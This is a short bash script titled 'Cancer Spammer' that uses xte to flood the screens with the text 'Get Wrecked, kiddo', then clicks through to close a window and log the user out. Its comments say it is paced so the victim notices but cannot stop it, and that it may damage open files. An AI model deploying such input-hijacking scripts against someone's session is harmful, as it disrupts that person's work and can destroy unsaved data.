#include /bin/bash
#
#
#Joshua Ruskauff
#
#
#Cancer Spammer
#
#DONT RUN THIS WITH OPEN FILES THAT YOU DONT WANT POSSIBLY SCREWED UP
#
###############################################################################
#this sets the initial position over the far left screen

xte 'mousemove 100 100'		

#This Biggest loop handles the creation of the phrase "Get Wrecked, kiddo | " by first looping the phrase 12 times on the screen.  Then, it repeats this for every screen (assuming there are only 4 "regular" screens on the computer).  finally, it centers back on the first screen to repeat the whole process another 25 times.  I could flood each screen with text individually, but while i was working i found splitting up the flooding into repetitions of 12 looked better.  It feels like its taking less time to happen from the viewer's perspective.

for x in {0..25}	
do
	for i in {0..3}
	do
		for z in {0..11}
		do
			xte 'str Get Wrecked, kiddo | '
		done	
		xte 'mousermove 520 0'	
	done
	xte 'mousemove 100 100'
done

#This handles the killing of the second screen from the left, and then kicking the user off their login through automated mouse movements and clicks.  I wanted to create a slower end, so the person could realize what was happening and attempt to stop it, but can't since by the time they realized what is happening, its too late.  So i intersperced three "sleep 1" commands so this effect could be visible.

xte "mousemove 540 20"
xte 'mouseclick 1'
xte 'mousermove 0 240'
xte 'mouseclick 1'
sleep 1
xte 'mouseclick 1'
sleep 1
xte 'mousermove 0 480'
sleep 1
xte 'mouseclick 1'

exit
